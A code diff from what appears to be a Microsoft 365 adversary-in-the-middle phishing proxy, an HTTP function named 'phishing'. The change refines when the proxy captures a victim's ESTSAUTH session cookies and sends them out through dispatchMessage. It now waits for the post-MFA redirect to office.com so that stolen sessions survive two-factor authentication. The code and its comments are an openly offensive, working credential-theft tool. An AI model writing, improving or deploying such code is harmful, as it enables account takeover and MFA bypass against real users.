@@ -152,12 +152,23 @@ app.http("phishing", {
           cookie.startsWith("SignInStateCookie=")
       );
 
-      // Success = ESTSAUTHPERSISTENT cookie present. On a real login the 3
-      // session cookies (ESTSAUTH, ESTSAUTHPERSISTENT, SignInStateCookie)
-      // arrive in SEPARATE responses — gating on length == 3 almost never
-      // fires. ESTSAUTHPERSISTENT is only set on the final successful login
-      // response, so it is the reliable capture+redirect trigger.
-      if (cookies.some((cookie) => cookie.startsWith("ESTSAUTHPERSISTENT="))) {
+      // Full-auth completion = the victim is being redirected back to office.
+      // Modern M365 login uses response_mode=form_post: the FINAL page after
+      // ALL auth steps (incl. 2FA/MFA) carries a hidden "code" input that
+      // auto-posts to https://www.office.com/landingv2. The ESTSAUTHPERSISTENT
+      // cookie alone fires too early — it can be set on the password POST
+      // response BEFORE MFA finishes. Detect the office redirect instead:
+      //   - 302 Location -> office.com, or
+      //   - form_post page body carrying the auth "code" (post-2FA page)
+      // No office redirect yet = 2FA still in progress = pass through, no
+      // cookie dispatch, no redirect.
+      const location = original_response.headers.get("location") || "";
+      const final_body = await original_response.clone().text();
+      const authComplete =
+        location.includes("office.com") ||
+        (final_body.includes('name="code"') && final_body.includes("office.com"));
+
+      if (authComplete) {
         dispatchMessage(
           "Captured required authentication cookies: <br>" +
             JSON.stringify(cookies)
